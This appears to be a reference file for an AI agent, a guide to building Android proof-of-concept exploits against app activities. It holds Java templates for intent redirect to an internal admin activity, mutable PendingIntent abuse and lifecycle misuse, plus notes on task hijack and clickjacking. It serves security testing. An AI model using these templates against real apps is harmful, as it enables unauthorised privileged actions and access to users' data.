---
name: poc-app-activity
description: Activity PoC reference covering exported access, intent redirect, fragment injection, path traversal, PendingIntent abuse, result leakage, task hijack, clickjacking, and lifecycle misuse.
---

# Activity PoC Reference

Attacker-reachable activity flows. Usually `direct-trigger`, `returned-handle`, or `ui-assisted` shapes.

## Construction Matrix

| Vulnerability | PoC shape | Typical support | Visible success |
|---|---|---|---|
| exported access | `direct-trigger` | none | protected screen/action becomes reachable |
| intent redirect | `direct-trigger` | none | nested Intent reaches internal component |
| fragment injection | `direct-trigger` | none | internal fragment is loaded |
| path traversal | `direct-trigger` | none | attacker-controlled path is accepted |
| PendingIntent abuse | `returned-handle` | none | victim-identity action executes |
| `setResult()` leak | `interception` | helper activity | sensitive result is returned |
| task hijack | `ui-assisted` | helper activity in Manifest | victim task shows attacker UI |
| clickjacking | `ui-assisted` | overlay service | trusted action is obscured |
| lifecycle misuse | `ui-assisted` | none | protected resource stays active after backgrounding |

## Shared Inputs

Victim activity class, launch action/extras/URI/nested Intent key, whether `startActivityForResult()` is needed, whether helper Manifest components are required, visible success signal.

## Pattern 1 - Direct Launch

For exported access, intent redirect, fragment injection, path traversal.

```java
private static void runActivityIntentRedirect(Context context) {
    Intent nested = new Intent();
    nested.setClassName("com.target", "com.target.InternalAdminActivity");
    nested.putExtra("admin_cmd", "grant_permission");

    Intent intent = new Intent();
    intent.setClassName("com.target", "com.target.ForwardActivity");
    intent.putExtra("forward_intent", nested);
    intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
    context.startActivity(intent);
    Log.i("PoC", "Launched ForwardActivity with nested attacker-controlled Intent");
}
```

Registration:

```java
static {
    register("activity-launch", "Launch Exported Activity", () -> runActivityIntentRedirect(appContext));
}
```

Use when: the vulnerable path is proven by one `startActivity(...)` and no result-capture or helper UI flow is required.

## Pattern 2 - Returned Handle

For mutable `PendingIntent` delivery or `setResult()` leakage.

```java
private static void runActivityPendingIntentAbuse(Context context) {
    Intent malicious = new Intent();
    malicious.setClassName("com.target", "com.target.PrivilegedActivity");

    PendingIntent pendingIntent = PendingIntent.getActivity(context, 0, malicious, PendingIntent.FLAG_MUTABLE);

    Intent intent = new Intent();
    intent.setClassName("com.target", "com.target.ExecutePendingIntentActivity");
    intent.putExtra("pending_intent", pendingIntent);
    intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
    context.startActivity(intent);
    Log.i("PoC", "Delivered attacker-controlled PendingIntent to exported activity");
}
```

Use when: the activity accepts a `PendingIntent` from an external caller, or returns sensitive data via `setResult()`.

## Pattern 3 - UI-Assisted

For task hijack, clickjacking, lifecycle misuse.

```java
private static void runActivityLifecycleMisuse(Context context) {
    Intent camera = new Intent();
    camera.setClassName("com.target", "com.target.CameraActivity");
    camera.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
    context.startActivity(camera);

    new Handler(Looper.getMainLooper()).postDelayed(() -> {
        Intent home = new Intent(Intent.ACTION_MAIN);
        home.addCategory(Intent.CATEGORY_HOME);
        home.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        context.startActivity(home);
        Log.i("PoC", "Moved target to background. Check whether protected resource remains active.");
    }, 2000);
}
```

Manifest support: helper activity with matching `taskAffinity` for task hijack; helper service with overlay permission for clickjacking.

Do not use `ui-assisted` for ordinary exported launches that already prove the bug.
